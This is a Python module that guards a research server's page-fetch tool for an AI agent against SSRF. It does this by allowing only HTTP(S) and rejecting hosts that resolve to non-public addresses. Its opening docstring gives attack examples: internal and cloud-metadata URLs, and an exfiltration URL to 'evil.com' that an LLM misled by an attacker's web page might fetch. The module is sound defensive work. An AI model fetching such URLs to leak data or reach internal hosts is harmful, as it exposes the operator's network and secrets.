"""URL admission control for the research server.

This is the module that decides what Tau is allowed to reach out and touch. It exists because
`fetch_page` is the first *outbound* capability in the whole system: every other domain server
talks to something on the home LAN that the operator installed on purpose, whereas this one takes
a URL that - directly or indirectly - can come from an LLM that just read an attacker's web page.

Two distinct threats, and it is worth keeping them apart:

1. **SSRF.** "Fetch http://192.168.1.10/admin" or "http://169.254.169.254/latest/meta-data/".
   Tau sits on a home-lab VLAN with Proxmox, Home Assistant and camera hosts on it. A fetch tool
   that resolves to a private address turns the research server into a proxy into that VLAN from
   whatever the model was persuaded to fetch. This module blocks that, and blocks it *after* DNS
   resolution, because "evil.com" resolving to 127.0.0.1 is the entire point of a DNS-rebinding
   attack - checking the hostname string would catch nothing.

2. **Exfiltration.** "Fetch https://evil.com/?x=<everything you know>". This module cannot stop
   that; no URL filter can, short of an allowlist. See the module note in server.py and the
   honest-limits section of project-tau-plan.md §8.7 - the real mitigation is architectural
   (run research in a scoped sub-agent that holds nothing worth stealing), not a blocklist.
"""

from __future__ import annotations

import ipaddress
import socket
from urllib.parse import urlparse

# Only ever speak HTTP(S). file:// would read the host's disk, ftp:// / gopher:// are SSRF
# classics, and data:/javascript: are not fetches at all.
ALLOWED_SCHEMES = frozenset({"http", "https"})

DEFAULT_MAX_BYTES = 2 * 1024 * 1024
DEFAULT_TIMEOUT_SECONDS = 15.0
# Each hop is re-validated, so this bounds work rather than safety - but an unbounded redirect
# chain is its own denial-of-service.
MAX_REDIRECTS = 5


class UnsafeURLError(ValueError):
    """The URL is not one this server will fetch. The message is shown to the model, so it says
    what was refused and why, without leaking internal network detail."""


def _is_public_address(ip: ipaddress.IPv4Address | ipaddress.IPv6Address) -> bool:
    """True only for addresses that are globally routable unicast on the public internet.

    Built on `is_global` rather than a blocklist of known-bad ranges, because a blocklist has to
    remember loopback, RFC1918, link-local (including the 169.254.169.254 cloud-metadata
    endpoint), CGNAT, IPv6-mapped IPv4, unique-local... and a forgotten range is a hole.

    But `is_global` alone is NOT the property wanted, which a test caught: for IPv4 the stdlib
    defines it as roughly "not private", and 224.0.0.0/4 is not in its private list - so
    `ip_address("224.0.0.1").is_global` is True. Multicast, reserved and unspecified are
    therefore excluded explicitly. None of them is a plausible research target, so requiring
    plain global unicast costs nothing.
    """
    if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped is not None:
        # ::ffff:127.0.0.1 is loopback wearing a hat; is_global on the v6 form would not see it.
        return _is_public_address(ip.ipv4_mapped)
    if ip.is_multicast or ip.is_reserved or ip.is_unspecified or ip.is_loopback:
        return False
    return ip.is_global


def resolve_public_host(host: str, port: int) -> list[str]:
    """Resolves `host` and returns its addresses, or raises if ANY of them is non-public.

    Every resolved address must be public, not merely the first: a hostname that returns both a
    public and a private address would otherwise be a coin flip, and the attacker picks the coin.
    """
    try:
        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
    except socket.gaierror as exc:
        raise UnsafeURLError(f"Could not resolve host '{host}'") from exc

    addresses = sorted({info[4][0] for info in infos})
    if not addresses:
        raise UnsafeURLError(f"Could not resolve host '{host}'")

    for address in addresses:
        try:
            ip = ipaddress.ip_address(address)
        except ValueError as exc:
            raise UnsafeURLError(f"Host '{host}' resolved to an unusable address") from exc
        if not _is_public_address(ip):
            # Deliberately does not echo the resolved address back: the reply reaches the model
            # (and possibly a transcript), and "evil.com resolved to 10.0.4.7" is free internal
            # network reconnaissance for whoever controls evil.com's DNS.
            raise UnsafeURLError(
                f"Refusing to fetch '{host}': it resolves to a private or non-public address. "
                "This server only reaches the public internet - it is not a way into the home "
                "network."
            )
    return addresses


def validate_url(url: str) -> str:
    """Returns the URL if this server may fetch it, else raises UnsafeURLError."""
    url = (url or "").strip()
    if not url:
        raise UnsafeURLError("No URL given")

    parsed = urlparse(url)
    if parsed.scheme.lower() not in ALLOWED_SCHEMES:
        raise UnsafeURLError(
            f"Refusing to fetch scheme '{parsed.scheme or '(none)'}': only http and https are allowed."
        )
    if not parsed.hostname:
        raise UnsafeURLError(f"Refusing to fetch '{url}': no hostname.")

    port = parsed.port or (443 if parsed.scheme.lower() == "https" else 80)
    resolve_public_host(parsed.hostname, port)
    return url
